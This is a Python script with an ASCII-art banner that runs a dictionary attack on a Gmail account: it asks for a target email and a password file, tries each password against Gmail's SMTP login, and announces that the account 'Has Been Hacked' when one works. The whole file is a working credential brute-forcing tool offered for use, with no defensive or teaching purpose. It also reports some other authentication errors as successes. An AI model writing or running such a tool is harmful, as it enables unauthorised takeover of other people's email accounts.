#!/usr/bin/python3
"""
Created by the_only_rb
"""

import smtplib
from os import system


def main():
    print('=================================================')
    print('               Created by star_dev.         ')
    print('=================================================')
    print('               ++++++++++++++++++++              ')
    print('\n')
    print('  _,.                                            ')
    print('                                                 ')
    print('           Star                               ')
    print('       _,.                   ')
    print('     ,` -.)                  ')
    print('    ( _/-\\-._               ')
    print('   /,|`--._,-^|            , ')
    print('   \_| |`-._/||          , | ')
    print('     |  `-, / |         /  / ')
    print('     |     || |        /  /  ')
    print('      `r-._||/   __   /  /   ')
    print('  __,-<_     )`-/  `./  /    ')
    print('  \   `---    \   / /  /     ')
    print('     |           |./  /      ')
    print('     /           //  /       ')
    print(' \_/  \         |/  /        ')
    print('  |    |   _,^- /  /         ')
    print('  |    , ``  (\/  /_         ')
    print('   \,.->._    \X-=/^         ')
    print('   (  /   `-._//^`           ')
    print('    `Y-.____(__}             ')
    print('     |     {__)              ')
    print('           ()   V.1.0        ')


def login(pass_list):
    i = 0
    user_name = input('Target email: ')
    try:
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.ehlo()
    except Exception as e:
        print(f"Error connecting to SMTP server: {e}")
        return

    for password in pass_list:
        i += 1
        print(f"{i}/{len(pass_list)}")
        try:
            server.login(user_name, password.strip())
            system('clear')
            main()
            print('\n')
            print(f'[+] This Account Has Been Hacked! Password: {password.strip()}     ^_^')
            break
        except smtplib.SMTPAuthenticationError as e:
            error = str(e)
            if "Username and Password not accepted" not in error:
                system('clear')
                main()
                print(f'[+] This Account Has Been Hacked! Password: {password.strip()}     ^_^')
                break
            else:
                print(f'[!] Password not found => {password.strip()}')
        except Exception as e:
            print(f"Unexpected error: {e}")
    server.quit()


if __name__ == "__main__":
    main()
    print('[1] Start the attack')
    print('[2] Exit')

    try:
        option = int(input('==> '))
    except ValueError:
        print("Invalid option. Exiting.")
        exit()

    if option == 1:
        file_path = input('Path of passwords file: ')
        try:
            with open(file_path, 'r') as pass_file:
                pass_list = pass_file.readlines()
        except FileNotFoundError:
            print("Password file not found. Exiting.")
            exit()
        login(pass_list)
    else:
        system('clear')
        exit()
